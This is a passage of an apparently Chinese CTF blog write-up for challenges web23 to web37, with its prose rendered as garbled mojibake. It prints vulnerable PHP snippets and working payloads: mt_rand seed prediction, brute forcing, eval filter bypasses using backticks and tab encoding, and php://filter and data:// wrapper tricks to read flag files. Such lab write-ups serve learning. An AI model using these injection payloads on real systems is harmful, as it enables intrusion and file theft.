class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;åŠ å¯†åçš„md5å€¼ä¸ºï¼š&quot;</span>.$token).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;è§£å¯†åçš„å€¼ä¸ºï¼š&quot;</span>.$dict[$i].$dict[$j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pythonç‰ˆæœ¬è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/2 11:58</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (str(i) + str(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]):</span><br><span class="line">            <span class="keyword">if</span> ((int(m[<span class="number">1</span>:<span class="number">2</span>]) + int(m[<span class="number">14</span>:<span class="number">15</span>]) + int(m[<span class="number">17</span>:<span class="number">18</span>])) / int(m[<span class="number">1</span>:<span class="number">2</span>])) == int(m[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                print(b)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°æ»¡è¶³çš„å€¼ï¼Œå³3j<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/1%40X%282I%7D%29WT%40%7DX%7B%7BC%7B%7DW%5BYO3.png" alt=""><br>
äºæ˜¯æ„é€ urlä¼ å‚token=3jï¼Œè·å¾—flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/%7DMZ8I%5BI%5BR%2441YZ%29P0%5DA8TU9.png" alt=""></p>
<h3 id="web24"><a class="header-anchor" href="#web24">Â¶</a>web24</h3>
<p>å®¡è®¡ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°å…¶å®è¿™æ˜¯ä¼ªéšæœºæ•°ï¼Œå› ä¸ºmt_srangå·²ç»å›ºå®šäº†ï¼Œæˆ‘ä»¬å†™ä¸ªä»£ç è¿è¡Œä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"> * Dateï¼š2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line">$result = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/7%28XX9%5BUBRX8TG%60%5BP4F8M%29%5BA.png" alt=""><br>
å¾—åˆ°1155388967ï¼Œæ‰€ä»¥æ„æˆ?r=1155388967å³å¯è·å¾—flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/N9%294NSPFPC1BUE%28KK%24%7B7Q7R.png" alt=""></p>
<h3 id="web25"><a class="header-anchor" href="#web25">Â¶</a>web25</h3>
<p>é¦–å…ˆå®¡è®¡ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡ç§å­æ²¡æœ‰ç»™å‡ºï¼Œä½†å‘ç°ä¸€ä¸ªå…³é”®åœ°æ–¹ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠä¼ å…¥çš„rè®¾ç½®ä¸º0ï¼Œå³?r=0ï¼Œå¯ä»¥è¾“å‡º$randçš„å€¼ï¼Œæ­¤æ—¶$rand=mt_rand()çš„å€¼ï¼Œä¹Ÿå°±æ˜¯éšæœºæ•°çš„å€¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/NM0%607T~RI%28QV7UQDCA%5B5%7DQT.png" alt=""><br>
è·å¾—éšæœºæ•°ä¸º86715576ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä½¿ç”¨é€†æ¨å·¥å…·å°è¯•é€†æ¨å‡ºç§å­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å·¥å…·åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line"></span><br><span class="line">gitä¸‹è½½æ–¹å¼ï¼šgit clone https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line">ä¸‹è½½åå‘½ä»¤è¡Œè¾“å…¥makeç„¶åå›è½¦ç¼–è¯‘å‡ºphp_mt_seedæ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_0%286QB7%245ME%24XVJ%5B2P8HMT0.png" alt=""><br>
å¾—åˆ°ç§å­ä¸º4188754181ï¼Œå› ä¸º$_COOKIE[â€˜tokenâ€™]çš„å€¼è¦ç­‰äºä¸¤ä¸ªéšæœºæ•°ç›¸åŠ ï¼Œäºæ˜¯æˆ‘ä»¬å†™ä¸ªè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"> * Dateï¼š2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">4188754181</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$result = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/LH_7%246BHAF3_G2K%24SH7_240.png" alt=""><br>
å¾—åˆ°tokençš„å€¼ä¸º2504830688</p>
<blockquote>
<p>æ‰€ä»¥å¼€å§‹æ„é€ <br>
ç¬¬ä¸€ä¸ªï¼Œæ„é€ ?r=86715576ï¼Œä½¿å¾—$rang=0ï¼Œæ»¡è¶³if((!$rand))ï¼Œè¿›å…¥ä¸‹ä¸€å±‚ifåˆ¤æ–­tokençš„å€¼<br>
ç¬¬äºŒä¸ªï¼Œæ„é€ cookieå¤´é‡Œçš„token=2504830688</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_LWI%60Z57MJJ6T~63%25%28%29F4Z5.png" alt=""><br>
æˆåŠŸæ‹¿åˆ°flag</p>
<h3 id="web26"><a class="header-anchor" href="#web26">Â¶</a>web26</h3>
<p>æ‰“å¼€é¡µé¢ï¼Œçœ‹åˆ°ä¸€ä¸ªç½‘ç«™<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/1XQD%5DP2%29%60E%24E61~M4R5D%25%5BT.png" alt=""><br>
å³é”®æŸ¥çœ‹æºç ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªcheckdb.php<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/P%7BD~2I33%245_RB%25ZPCX8%60L%60E.png" alt=""><br>
ç…§è¿™ä¸ªæ ¼å¼postå‘é€æ•°æ®ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/V0HXO4ABATGZ%7DPSLWUN969R.png" alt=""></p>
<h3 id="web27"><a class="header-anchor" href="#web27">Â¶</a>web27</h3>
<p>æ‰“å¼€ä¾ç„¶æ˜¯ä¸€ä¸ªcms<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/BP6EY%25%258HNQ%25QSL_HNCTKGH.png" alt=""><br>
ç‚¹å‡»å½•å–åå•ï¼Œä¸‹è½½å¾—åˆ°ä¸€ä»½åå•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/813HRBR%251X85L42%28FAI%298N3.png" alt=""><br>
å‘ç°èº«ä»½è¯ä¸­é—´å°‘äº†æ—¥æœŸï¼Œç»§ç»­å›åˆ°é¡µé¢ï¼Œç‚¹å‡»æŸ¥è¯¢ç³»ç»Ÿ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/AKL~%60%24QE%7DN%28F9E12TH%28IF03.png" alt=""><br>
éœ€è¦è¾“å…¥å§“åå’Œèº«ä»½è¯ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰äº†å§“åï¼Œèº«ä»½è¯æ¨¡ç³Šï¼Œé‚£è¿›è¡ŒæŠ“åŒ…çˆ†ç ´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/L%7D%28%25%40L7MXJ%40%60L%60ZE6ELV7OC.png" alt=""><br>
è®¾ç½®ä¸€ä¸‹çˆ†ç ´èº«ä»½è¯ä¸­çš„æ—¥æœŸ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/3328122SZ%5DDZ1A%283D9T1%290S.png" alt=""><br>
çˆ†ç ´ç»“æœ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/9STH6184%7DTQ%60%5DJTBMYXLM%40R.png" alt=""><br>
è§£ç ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/J%5D4371%5D%28~B5%29O4%5D%4070%5B%28V%7BH.png" alt=""><br>
å¾—åˆ°èº«ä»½è¯å·å’Œå­¦å·ï¼Œç„¶åå»é¦–é¡µç™»å½•ä¸€ä¸‹ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/HP%7B%29%24%246%28%29%40%5D80BW%7B%25BRO%5DFC.png" alt=""></p>
<h3 id="web28"><a class="header-anchor" href="#web28">Â¶</a>web28</h3>
<p>æ‰“å¼€é¡µé¢ï¼Œæ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯è§‚å¯Ÿåˆ°urlæœ‰äº›å¥‡æ€ª<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/R%7DN~3OR%24%29AYK3ZR%40KE_%28Z%24Y.png" alt=""><br>
åº”è¯¥æ˜¯çˆ†ç ´ç›®å½•ï¼ŒæŠ“åŒ…ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/L%7BZ%25%5BNXER14_RH%7DI~K7I%40EP.png" alt=""><br>
ä¸¤ä¸ªpayloadéƒ½é€‰æ‹©0åˆ°100è¿›è¡Œçˆ†ç ´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/F%28_C2B6B%60Q%24%25N~8VF%7BCZ~%258.png" alt=""><br>
åœ¨çˆ†ç ´ç»“æœä¸­å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/%5D3HMWR%29%7B%60I%60V8~D~987Z5WS.png" alt=""></p>
<h2 id="å‘½ä»¤æ‰§è¡Œ-29-77-118-122-124"><a class="header-anchor" href="#å‘½ä»¤æ‰§è¡Œ-29-77-118-122-124">Â¶</a>å‘½ä»¤æ‰§è¡Œ(29-77&amp;118-122&amp;124)</h2>
<h3 id="web29"><a class="header-anchor" href="#web29">Â¶</a>web29</h3>
<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå…ˆsystem(â€œlsâ€);æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/K%24S4PZ%5BAUUD6HI4V3BU%24%5BAW.png" alt=""><br>
æ—¢ç„¶è¿‡æ»¤äº†flagï¼Œé‚£æˆ‘ä»¬å°±fla*çš„å½¢å¼è¿›è¡ŒåŒ¹é…ï¼Œç»“åˆtacå‘½ä»¤è¾“å‡ºflag.phpæ–‡ä»¶å†…å®¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/PSF%24%29E%25DF_X2Q5%7DKHS%60%7DEVR.png" alt=""></p>
<h3 id="web30"><a class="header-anchor" href="#web30">Â¶</a>web30</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒæŠŠsystemå‘½ä»¤ç»™è¿‡æ»¤äº†ï¼Œä¸è¿‡æœ‰åˆ«çš„å§¿åŠ¿ï¼Œä¾‹å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯ä½¿ç”¨é€šé…ç¬¦è¿›è¡ŒåŒ¹é…ï¼Œä¸è¿‡æ¢äº†echoè¿›è¡Œè¾“å‡º<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/DY%28YYO%60%7DR_2%293%60MF2J%400A51.png" alt=""></p>
<h3 id="web31"><a class="header-anchor" href="#web31">Â¶</a>web31</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¼€å§‹è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæœ¬æ¥æˆ‘æ˜¯ä½¿ç”¨%20ç¼–ç ç»•è¿‡çš„ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸è¡Œ(æœ‰ç‚¹ç–‘æƒ‘)ï¼Œç„¶åå°±æ”¹ç”¨äº†%09</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/MPL%7BFEDQ%40VS%28C%5DK%24%60IZPGX3.png" alt=""></p>
<h3 id="web32"><a class="header-anchor" href="#web32">Â¶</a>web32</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠåå¼•å·å’Œechoéƒ½è¿‡æ»¤äº†ï¼Œä¸è¿‡è¿˜æœ‰æ–°å§¿åŠ¿ï¼Œåˆ©ç”¨includeå‡½æ•°(è¿˜æœ‰requireä¹Ÿå¯ä»¥)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>
æŠŠbase64è§£ç åå³å¯å¾—åˆ°flag</p>
<h3 id="web33"><a class="header-anchor" href="#web33">Â¶</a>web33</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¤šè¿‡æ»¤äº†åŒå¼•å·ï¼Œç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web34"><a class="header-anchor" href="#web34">Â¶</a>web34</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤šè¿‡æ»¤ä¸€ä¸ª:å·ï¼Œè¿˜æ˜¯å¯ä»¥ä½¿ç”¨ä¸Šä¸€é¢˜çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web35"><a class="header-anchor" href="#web35">Â¶</a>web35</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤šè¿‡æ»¤ä¸€ä¸ª&lt;å·å’Œä¸€ä¸ª=å·ï¼Œä¸è¿‡æ²¡æœ‰å½±å“ï¼Œç»§ç»­ä½¿ç”¨å‰é¢çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web36"><a class="header-anchor" href="#web36">Â¶</a>web36</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¢åŠ è¿‡æ»¤æ•°å­—ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰å½±å“ï¼Œç»§ç»­ä½¿ç”¨å‰é¢payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web37"><a class="header-anchor" href="#web37">Â¶</a>web37</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¢æ–°é¢˜äº†ï¼Œè¿™æ¬¡æ˜¯ä½¿ç”¨äº†includeè¯­å¥ï¼Œè¿™é‡Œè¿‡æ»¤äº†flagï¼Œæˆ‘ä»¬é‡‡ç”¨ä¼ªåè®®dataçš„æ–¹æ³•è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p>
